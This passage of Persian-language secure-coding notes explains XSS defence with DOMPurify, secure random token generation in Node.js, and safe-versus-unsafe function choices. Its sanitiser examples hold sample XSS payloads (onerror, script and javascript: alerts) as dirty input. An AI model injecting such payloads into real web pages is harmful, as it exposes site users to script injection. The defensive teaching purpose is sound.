	- این کتابخانه بصورت هوشمند توابع و کاراکتر های خطرناک را از متن ورودی حذف میکند. بنابراین پس از آن میتوانیم متن را حتی با `innerHTML` نیز بصورت امن بخوانیم.
- 2.1. **Use `DOMPurify` in Java Script:**
```html
<!DOCTYPE html>
<html>
<head>
    <!-- بارگذاری کتابخانه DOMPurify از CDN -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
</head>
<body>

<div id="safeContent"></div>

<script>
// ورودی کاربر که شامل HTML مخرب است
const dirtyHTML = `
    <p>این یک نظر است</p>
    <img src="x" onerror="alert('XSS!')">
    <script>alert('Bad!')<\/script>
    <a href="javascript:alert('Click')">کلیک کن</a>
    <b>متن بولد مجاز</b>
`;

//==========================================
// پاکسازی با DOMPurify
//==========================================
const cleanHTML = DOMPurify.sanitize(dirtyHTML);

// نمایش خروجی امن (حالا می‌توانیم از innerHTML استفاده کنیم)
document.getElementById('safeContent').innerHTML = cleanHTML;

// خروجی پاکسازی شده (تگ‌های خطرناک حذف می‌شوند):
// <p>این یک نظر است</p>
// <img src="x">                          ← onerror حذف شد
//                                        ← <script> کاملاً حذف شد
// <a>کلیک کن</a>                        ← javascript: حذف شد
// <b>متن بولد مجاز</b>                  ← تگ مجاز حفظ شد
</script>

</body>
</html>
```
- 2.2. **Use `DOMPurify` in Node.JS:**
```javascript Node.JS
//نصب: npm install dompurify jsdom
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
console.log(clean); // <img src="x">
```
3. **Defense Against PRNG Reset Attack:**
	1. در محیط Node.js، ماژول `crypto` توابع لازم را برای این دفاع فراهم می‌کند:
	- `crypto.randomBytes(size)`: برای تولید بایت‌های تصادفی امن.
	- `crypto.randomInt(min, max)`: برای تولید اعداد صحیح تصادفی امن.
```javascript
const crypto = require('crypto');

//==========================================
// crypto.randomBytes(size)
//==========================================

//تولید ۳۲ بایت تصادفی
const randomBuffer = crypto.randomBytes(32);
console.log('Random Buffer:', randomBuffer);
//<Buffer a3 f1 09 8b 2c 4d 7e ... >

//تبدیل به هگز (برای توکن بازیابی رمز)
const tokenHex = crypto.randomBytes(32).toString('hex');
console.log('HEX Token:', tokenHex);
//64 کاراکتر: a3f1098b2c4d7e1a9b3c5d7e9f1a3b5c7d9e1a3b5c7d9e1a3b5c7d9e1a3b

//تبدیل به Base64 (برای URL)
const tokenBase64 = crypto.randomBytes(32).toString('base64');
console.log('Base64 Token:', tokenBase64);

//تبدیل به Base64 URL-safe
const tokenURLSafe = crypto.randomBytes(32)
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
console.log('URL-safe Token:', tokenURLSafe);


//==========================================
// crypto.randomInt(min, max)
//==========================================

//تولید عدد ۶ رقمی (مثل کد تأیید)
const sixDigitCode = crypto.randomInt(100000, 1000000);
console.log('6-Digit Code:', sixDigitCode); // مثال: 847291

//تولید عدد بین ۱ تا ۱۰۰
const randomPercent = crypto.randomInt(1, 101);
console.log('Random Number 1-100:', randomPercent);

//تولید ۵ کد تأیید همزمان
const codes = [];
for (let i = 0; i < 5; i++) {
    codes.push(crypto.randomInt(100000, 1000000));
}
console.log('5 Confrim Code:', codes); // [847291, 563901, 120384, 998273, 445612]
```
###### XSS Hardening Strategy - Brief Description
1. **XSS:**
	1. همیشه خروجی را قبل از نمایش در مرورگر Escape کنید. وردپرس با `esc_*` و PHP با `htmlspecialchars` این کار را می‌کنند.
2. **PRNG Attack:**
	1. همیشه برای تولید هرگونه توکن امنیتی از CSPRNG استفاده کنید. توابع `mt_rand()` و `rand()` صرفاً برای کاربردهای غیرامنیتی هستند.
	2. https://github.com/daniel-mwendwa/predictable-randomness-exploitation
###### Comparing Table - Safe VS Unsafe
| کاربرد                     | ❌ روش ناامن            | ✅ روش امن                                 |
| -------------------------- | ---------------------- | ----------------------------------------- |
| **توکن بازیابی رمز (PHP)** | `mt_rand()`            | `bin2hex(random_bytes(32))`               |
| **کد تأیید (PHP)**         | `rand(100000, 999999)` | `random_int(100000, 999999)`              |
| **توکن (Node.js)**         | `Math.random()`        | `crypto.randomBytes(32).toString('hex')`  |
| **نمایش نظر کاربر (PHP)**  | `echo $comment`        | `echo esc_html($comment)`                 |
| **درج متن (JS)**           | `el.innerHTML = data`  | `el.textContent = data`                   |
| **HTML پیچیده (JS)**       | `el.innerHTML = data`  | `el.innerHTML = DOMPurify.sanitize(data)` |
### a